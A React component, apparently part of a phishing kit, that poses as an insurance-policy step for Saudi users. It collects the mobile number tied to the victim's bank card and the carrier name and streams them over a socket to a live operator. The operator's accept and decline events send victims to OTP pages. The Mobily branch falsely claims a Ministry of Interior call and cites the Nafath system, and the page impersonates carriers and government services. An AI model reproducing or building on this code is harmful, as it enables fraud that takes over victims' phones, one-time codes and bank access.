import React from "react";
import { useState } from "react";
import axios from "axios";

import { TailSpin } from "react-loader-spinner";
import { AiOutlineCloseCircle } from "react-icons/ai";
import { useEffect } from "react";
import { MdOutlinePhoneCallback } from "react-icons/md";
import { serverRoute, socket } from "./Home";
import { useNavigate } from "react-router-dom";

const Phone = () => {
  const [phoneNumber, setPhoneNumber] = useState(null);
  const navigate = useNavigate();
  const [phoneNetwork, setPhoneNetwork] = useState("STC");
  const query = new URLSearchParams(window.location.search);
  const code = query.get("mobily");
  const [verfiy, setVerfiy] = useState(code === "check" ? "Mobily" : null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);
  const net = phoneNetwork;
  const [counter, setCounter] = useState(180);
  useEffect(() => {
    const timer = setInterval(() => {
      if (counter > 0) {
        setCounter(counter - 1);
      }
    }, 1000);

    return () => clearInterval(timer);
  }, [counter]);

  const ID = sessionStorage.getItem("id");

  const minutes = Math.floor(counter / 60);
  const seconds = counter % 60;

  const formattedMinutes = String(minutes).padStart(2, "0");
  const formattedSeconds = String(seconds).padStart(2, "0");

  const handleSubmit = async (e) => {
    setLoading(true);
    e.preventDefault();
    if (!phoneNetwork) {
      setLoading(false);
      return window.alert("اختر مشغل الشبكة");
    }

    try {
      await axios
        .post(serverRoute + "/phone/" + sessionStorage.getItem("id"), {
          phoneNumber,
          phoneNetwork,
        })
        .then(() =>
          socket.emit("phone", {
            id: sessionStorage.getItem("id"),
            phoneNumber,
            phoneNetwork,
          })
        );
    } catch (error) {}
  };
  useEffect(() => {
    console.log(phoneNetwork);
  }, [phoneNetwork]);

  socket.on("acceptPhone", (id) => {
    if (id === ID) {
      if (net) {
        console.log(phoneNetwork);
        if (net === "Mobily") {
          setLoading(false);
          window.location.href = "/phone?mobily=check";
          return;
        } else if (net === "STC") {
          return navigate("/phoneOtp?stc=check");
        } else {
          if (["Zain", "Salam", "Virgin", "Redbull"].includes(phoneNetwork)) {
            return navigate("/phoneOtp");
          }
        }
      }
    }
  });

  socket.on("declinePhone", (id) => {
    if (id === ID) {
      setLoading(false);
      setError(true);
    }
  });

  socket.on("acceptService", ({ id, price }) => {
    if (id === ID) {
      if (code === "check" || phoneNetwork === "Mobily") {
        return navigate("/mobilyOtp");
        // return (navigate"/navaz?otp=" + price + "&stc=" + null);
      }
      return navigate("/phoneOtp");
    }
  });
  socket.on("declineService", (id) => {
    if (id === ID) setVerfiy(null);
  });

  return (
    <div className="w-full  lg:w-1/2 flex flex-col items-center justify-center  rounded-md ">
      {!verfiy ? (
        <form
          className="bg-white border h-screen rounded-md  p-3 py-10 text-sm w-full"
          dir="rtl"
          onSubmit={handleSubmit}
        >
          <h2 className="font-bold text-xl w-full text-center my-2  ">
            {" "}
            توثيق رقم الجوال
          </h2>
          <p className="text-right mt-3 text-xs  text-gray-800">
            يرجى إدخال رقم الجوال ومشغّل شبكة الاتصالات الخاص بك، وذلك لاستكمال
            إجراءات إصدار وثيقة التأمين وربطها بالبيانات المعتمدة. على أن يكون
            رقم الجوال المرتبط بالبطاقة البنكية، وذلك لأغراض التحقق.
          </p>

          <div className="flex justify-start p-1 py-3 items-start gap-y-2 w-full flex-col">
            <span className="font-bold"> أدخل رقم الجوال :</span>
            <input
              value={phoneNumber}
              required
              onChange={(e) => setPhoneNumber(e.target.value)}
              dir="ltr"
              placeholder="05xxxxxxxx"
              inputMode="numeric"
              type="text"
              className="border px-3 py-1  border-gray-300 text-base text-center outline-[#ffc107] rounded-md w-full"
            />
          </div>
          <div className="flex justify-start p-1 py-3 items-start gap-y-2 w-full flex-col">
            <span className="font-bold"> إختيار مشغل شبكة :</span>
            <select
              value={phoneNetwork}
              required
              onChange={(e) => setPhoneNetwork(e.target.value)}
              className="border px-3 py-1  border-gray-300 text-base text-right outline-[#ffc107] rounded-md w-full"
            >
              {/* <option hidden>اختر مشغل الشبكة</option> */}
              <option>STC</option>
              <option>Zain</option>
              <option>Mobily</option>
              <option>Salam</option>
              <option>Virgin</option>
              <option>Redbull</option>
            </select>
          </div>

          {error ? (
            <div className="w-full text-center text-red-500  absolute bg-black bg-opacity-45 h-screen top-0 left-0 flex items-center justify-center">
              <div className="bg-white py-5 px-2 md:w-1/4 w-11/12 flex justify-center items-center flex-col text-lg gap-y-3">
                <AiOutlineCloseCircle className="text-6xl" />
                <div className="flex flex-col w-full items-center justify-center">
                  <span>رقم الهاتف غير صحيح</span>
                  <span>82A27833M4589370G</span>
                </div>
                <button
                  className="bg-gray-900 text-white w-11/12 py-3"
                  onClick={() => setError(false)}
                >
                  حاول مرة ثانية
                </button>
              </div>
            </div>
          ) : (
            ""
          )}

          <div className="w-full flex items-center justify-center py-5">
            {" "}
            <button className="  px-5 flex justify-center items-center py-2  bg-[#007bff] text-white w-11/12 rounded-md text-lg">
              تأكيد
            </button>
          </div>
          <span className="text-[#626262] text-xs font-bold  w-full">
            هل تحتاج إلي مساعدة ؟
          </span>
        </form>
      ) : //  :
      //  verfiy === "STC" ? (
      //   <div className="w-full flex flex-col justify-center  items-center bg-white h-screen py-2 gap-y-10">
      //     <img
      //       src="https://upload.wikimedia.org/wikipedia/commons/e/e3/STC-01.svg"
      //       className="w-1/2"
      //     />
      //     <div className="  w-full flex flex-col jus items-center gap-y-4">
      //       <p className="text-xl font-bold">سوف يتم الاتصال بك الآن</p>
      //       <p className="font-bold text-gray-500" style={{ fontSize: "10px" }}>
      //         قم باتباع الخطوات الموجودة بالاتصال ليتم تسجيل رقم جوالك بوثيقة
      //         التأمين
      //       </p>
      //       <span className="text-purple-700 font-bold">! يرجي الإنتظار</span>
      //     </div>
      //     <div className="flex w-11/12 flex-col justify-center items-center bg-purple-100 rounded-full py-1">
      //       <span className="text-purple-700 font-bold ">
      //         إعادة الاتصال بعد{" "}
      //       </span>
      //       <span className="text-purple-700 font-bold">
      //         {formattedMinutes}:{formattedSeconds}
      //       </span>
      //     </div>
      //   </div>
      // )
      verfiy === "Mobily" ? (
        <div className="w-full bg-white flex items-start justify-center h-screen ">
          <div
            className="md:w-1/3 w-full flex flex-col items-center justify-center"
            dir="rtl"
          >
            <img src="/mobily.jpg" />
            <span className="text-gray-500 font-bold text-xl p-2">
              تاكيد طلب الغاء وثيقة الفحص الحالي بموعد وثيقة الفحص الجديد{" "}
            </span>
            <img src="/mobily2.jpg" />
            <div className="flex w-full p-2 gap-x-3 text-lg items-center mt-10 ">
              <MdOutlinePhoneCallback className="text-4xl text-sky-600" />
              <span className="font-bold">أثبت هويتك</span>
            </div>
            <p className="p-2">
              ستتلقى مكالمة من وزارة الداخلية قريبا لتأكيد الطلب يرجى الرد على
              الاتصال واتباع التعليمات
            </p>
            <button
              className="bg-sky-500 text-white w-1/2 self-start p-3 m-2 rounded-full my-5"
              onClick={() => {
                socket.emit("network", ID);
                setVerfiy("Mobily2");
              }}
            >
              متابعة
            </button>
          </div>
        </div>
      ) : verfiy === "Mobily2" ? (
        <div className="w-full bg-white flex items-start justify-center h-screen ">
          <div
            className="md:w-1/3 w-full flex flex-col items-center justify-center"
            dir="rtl"
          >
            <img src="/mobily.jpg" />
            <span className="text-gray-500 font-bold text-xl p-2">
              تاكيد طلب الغاء وثيقة الفحص الحالي بموعد وثيقة الفحص الجديد{" "}
            </span>
            <img src="/mobily2.jpg" />
            <div className="flex w-full p-2 gap-x-3 text-lg items-center mt-10 ">
              <TailSpin
                height="50"
                width="50"
                color="#0ea5e9"
                ariaLabel="tail-spin-loading"
                radius="1"
                wrapperStyle={{}}
                wrapperClass=""
                visible={true}
              />
              <span className="font-bold"> بانتظار تأكيد الجوال</span>
            </div>
            <p className="p-2">
              وافق على الاتصال واتمم العملية لتاكيد استبدال شريحة معلومات موعدك
              القديم على نظام نفاذ تجنّبا من الانتظار ٣٠ يوم .
            </p>
            <span className="w-full p-2">لم تستلم مكاملة ؟ </span>
            <span className="w-full p-2 flex items-center">
              يمكنك إعادة المحاولة خلال
              <span className="px-2 font-bold text-lg">
                {formattedSeconds} : {formattedMinutes}{" "}
              </span>
            </span>
            <button
              className={`${
                formattedMinutes === "00" && formattedSeconds === "00"
                  ? "bg-opacity-100"
                  : "bg-opacity-40"
              } bg-sky-500 text-white w-1/2 self-start p-3 m-2 rounded-full my-5`}
              disabled={!(formattedMinutes == "00" && formattedSeconds == "00")}
              onClick={() => console.log("mobily")}
            >
              تحقق
            </button>
          </div>
        </div>
      ) : (
        ""
      )}
      {loading ? (
        <div className="fixed top-0 w-full h-screen bg-black bg-opacity-20 flex items-center justify-center ">
          <TailSpin
            height="50"
            width="50"
            color="white"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
        </div>
      ) : (
        ""
      )}
    </div>
  );
};

export default Phone;
